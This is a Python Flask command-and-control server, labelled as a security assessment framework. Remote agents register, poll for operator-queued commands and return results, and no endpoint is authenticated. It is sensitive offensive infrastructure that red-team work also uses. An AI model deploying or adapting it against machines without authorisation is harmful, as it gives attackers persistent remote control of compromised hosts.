#!/usr/bin/env python3
"""
C2 Operator Server
Main control server for managing agents and security assessments
"""

from flask import Flask, request, jsonify
from datetime import datetime
import json
import os
import uuid
import threading
import time

app = Flask(__name__)

# In-memory storage for agents and results
agents = {}
assessment_results = {}
pending_commands = {}

class Agent:
    def __init__(self, agent_id, hostname, platform, ip_address):
        self.agent_id = agent_id
        self.hostname = hostname
        self.platform = platform
        self.ip_address = ip_address
        self.last_seen = datetime.now()
        self.status = "active"
        self.commands_executed = 0

    def to_dict(self):
        return {
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "platform": self.platform,
            "ip_address": self.ip_address,
            "last_seen": self.last_seen.isoformat(),
            "status": self.status,
            "commands_executed": self.commands_executed
        }

@app.route('/api/register', methods=['POST'])
def register_agent():
    """Agent registration endpoint"""
    data = request.json
    agent_id = data.get('agent_id')
    hostname = data.get('hostname')
    platform = data.get('platform')
    ip_address = request.remote_addr

    if agent_id not in agents:
        agent = Agent(agent_id, hostname, platform, ip_address)
        agents[agent_id] = agent
        print(f"[+] New agent registered: {agent_id} ({hostname} - {platform})")
    else:
        agents[agent_id].last_seen = datetime.now()
        agents[agent_id].status = "active"

    return jsonify({"status": "success", "agent_id": agent_id})

@app.route('/api/checkin', methods=['POST'])
def agent_checkin():
    """Agent check-in and command retrieval"""
    data = request.json
    agent_id = data.get('agent_id')

    if agent_id in agents:
        agents[agent_id].last_seen = datetime.now()

        # Check for pending commands
        if agent_id in pending_commands and pending_commands[agent_id]:
            command = pending_commands[agent_id].pop(0)
            return jsonify({"status": "success", "command": command})

    return jsonify({"status": "success", "command": None})

@app.route('/api/results', methods=['POST'])
def receive_results():
    """Receive assessment results from agents"""
    data = request.json
    agent_id = data.get('agent_id')
    module = data.get('module')
    results = data.get('results')

    if agent_id in agents:
        agents[agent_id].last_seen = datetime.now()
        agents[agent_id].commands_executed += 1

        # Store results
        if agent_id not in assessment_results:
            assessment_results[agent_id] = []

        assessment_results[agent_id].append({
            "timestamp": datetime.now().isoformat(),
            "module": module,
            "results": results
        })

        print(f"[+] Received results from {agent_id} - Module: {module}")

    return jsonify({"status": "success"})

@app.route('/api/command', methods=['POST'])
def send_command():
    """Operator interface to send commands to agents"""
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')

    if agent_id not in agents:
        return jsonify({"status": "error", "message": "Agent not found"}), 404

    if agent_id not in pending_commands:
        pending_commands[agent_id] = []

    pending_commands[agent_id].append(command)
    print(f"[+] Command queued for {agent_id}: {command}")

    return jsonify({"status": "success", "message": "Command queued"})

@app.route('/api/agents', methods=['GET'])
def list_agents():
    """List all registered agents"""
    agent_list = [agent.to_dict() for agent in agents.values()]
    return jsonify({"agents": agent_list})

@app.route('/api/results/<agent_id>', methods=['GET'])
def get_results(agent_id):
    """Get assessment results for a specific agent"""
    if agent_id not in assessment_results:
        return jsonify({"results": []})

    return jsonify({"results": assessment_results[agent_id]})

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "online",
        "active_agents": len([a for a in agents.values() if a.status == "active"]),
        "total_agents": len(agents)
    })

def cleanup_inactive_agents():
    """Background task to mark inactive agents"""
    while True:
        time.sleep(60)
        current_time = datetime.now()
        for agent in agents.values():
            time_diff = (current_time - agent.last_seen).total_seconds()
            if time_diff > 300:  # 5 minutes
                if agent.status != "inactive":
                    agent.status = "inactive"
                    print(f"[-] Agent {agent.agent_id} marked as inactive")

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║     C2 Operator Server v1.0           ║
    ║   Security Assessment Framework       ║
    ╚═══════════════════════════════════════╝
    """)
    print("[*] Starting operator server on http://0.0.0.0:5000")
    print("[*] Use operator CLI to interact with agents")

    # Start background cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_inactive_agents, daemon=True)
    cleanup_thread.start()

    app.run(host='0.0.0.0', port=5000, debug=False)
